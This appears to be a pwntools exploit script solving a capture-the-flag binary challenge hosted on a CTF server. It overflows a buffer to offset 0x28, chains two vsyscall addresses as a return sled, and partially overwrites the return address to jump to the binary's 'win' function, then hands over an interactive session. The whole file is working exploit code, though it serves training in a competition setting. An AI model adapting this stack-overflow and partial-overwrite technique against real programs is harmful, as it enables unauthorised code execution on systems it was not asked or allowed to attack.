#!/usr/bin/env python
# from ctypes import cdll
# libc = cdll.LoadLibrary('libc.so.6')
# from pathlib import Path
from pwn import *
sys.tracebacklimit = 3
context(endian = "little", encoding='ascii') # arch='amd64'
context.terminal = ["tmux", "splitw", "-h"]
const = constants
exe_path = ('./chall')
e = context.binary = ELF(exe_path, checksec=False)
# libc_path = ('./libc.so.6')
# libc_path = ('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF(libc_path, checksec=False)
gdbscript = """\
#source /home/hacker/.gef.py
#gef config context.layout ''
# -- exe
#break *0x401234
#continue
# disp/3i $pc
"""
host, port = ('nc virtual.ctf.theromanxpl0.it 7011').split()[-2:]

def u64(b): return packing.u64(b.ljust(8, b'\0'))

def gdb_pause(interactive=False):
    if args.REMOTE: return
    d = r.clean(0.1)
    input(f'gdb {r.pid}')
    if interactive: r.interactive()
    r.unrecv(d)

def conn(argv=[], env=None):
    if args.REMOTE:
        r = remote(host, int(port))
    elif args.GDB:
        r = gdb.debug(argv or [exe_path], exe=exe_path, gdbscript=gdbscript, env=env)
    else:
        r = process(argv or [exe_path], env=env)
    return r

prompt = '!!!\n'

"""
vsyscall <https://discord.com/channels/1336749230336901162/1337064850177921055/1343221815014854757>.
"""
def main():
    global r
    VSYSCALL_ADDR = 0xffffffffff600000
    payload = flat({0x28: [VSYSCALL_ADDR] * 2}, p8(e.sym.win & 0xff))
    r = conn(env={'FLAG': r'flag{fakeflag}'})
    r.sendafter(prompt, payload)
    pass

try:
    main()
    # r.clean(0.2)
    r.interactive()
# except KeyboardInterrupt:
#     import traceback
#     traceback.print_exc()
#     exit(2)
except Exception as exc:
    raise exc
